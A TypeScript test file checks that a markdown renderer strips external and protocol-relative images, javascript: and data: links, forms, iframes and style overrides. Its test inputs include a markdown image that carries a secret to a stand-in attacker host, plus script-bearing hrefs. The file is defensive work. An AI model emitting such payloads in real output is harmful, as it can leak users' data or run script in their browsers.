import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

function dom(source: string): HTMLElement {
  const root = document.createElement("div");
  root.innerHTML = renderMarkdown(source);
  return root;
}

describe("renderMarkdown images", () => {
  it("replaces an external https image with a placeholder", () => {
    const root = dom("![secret](https://evil.example/?d=secret)");
    expect(root.querySelector("img")).toBeNull();
    expect(root.innerHTML).not.toContain("evil.example");
    expect(root.textContent).toContain("secret");
    expect(root.querySelector(".image-blocked")).not.toBeNull();
  });

  it("removes a raw HTML <img> with an external src", () => {
    const root = dom('<img src="http://evil.example/x.png" alt="x">');
    expect(root.querySelector("img")).toBeNull();
  });

  it("removes a protocol-relative image", () => {
    const root = dom("![x](//evil.example/x.png)");
    expect(root.querySelector("img")).toBeNull();
  });

  it("keeps data:image sources", () => {
    const root = dom("![x](data:image/png;base64,AAAA)");
    expect(root.querySelector("img")?.getAttribute("src")).toBe("data:image/png;base64,AAAA");
  });

  it("keeps same-origin relative paths", () => {
    const root = dom("![x](/icons/x.png)");
    expect(root.querySelector("img")?.getAttribute("src")).toBe("/icons/x.png");
  });

  it("blocks same-origin images outside the static folders", () => {
    for (const src of ["/api/data/memories?person=all", "/host/server", "/icons/../api/x"]) {
      const root = dom(`![x](${src})`);
      expect(root.querySelector("img")).toBeNull();
      expect(root.querySelector(".image-blocked")).not.toBeNull();
    }
  });
});

describe("renderMarkdown links and tags", () => {
  it("opens links in a new tab with a hardened rel", () => {
    const a = dom("[site](https://example.com)").querySelector("a");
    expect(a?.getAttribute("target")).toBe("_blank");
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it("strips javascript: hrefs", () => {
    const root = dom('<a href="javascript:alert(1)">x</a>');
    expect(root.innerHTML).not.toContain("javascript:");
  });

  it("strips data: hrefs", () => {
    const a = dom('<a href="data:text/html,<script>alert(1)</script>">x</a>').querySelector("a");
    expect(a?.getAttribute("href") ?? "").not.toMatch(/^data:/i);
  });

  it("strips forms, iframes, inputs, buttons and style tags", () => {
    const root = dom(
      '<form action="https://evil"><input name="a"><button>go</button></form>' +
        '<iframe src="https://evil"></iframe><style>body{display:none}</style><p>ok</p>',
    );
    for (const tag of ["form", "input", "button", "iframe", "style"]) {
      expect(root.querySelector(tag)).toBeNull();
    }
    expect(root.textContent).toContain("ok");
  });

  it("strips style attributes", () => {
    const root = dom('<p style="position:fixed;inset:0">x</p>');
    expect(root.querySelector("p")?.hasAttribute("style")).toBe(false);
  });
});
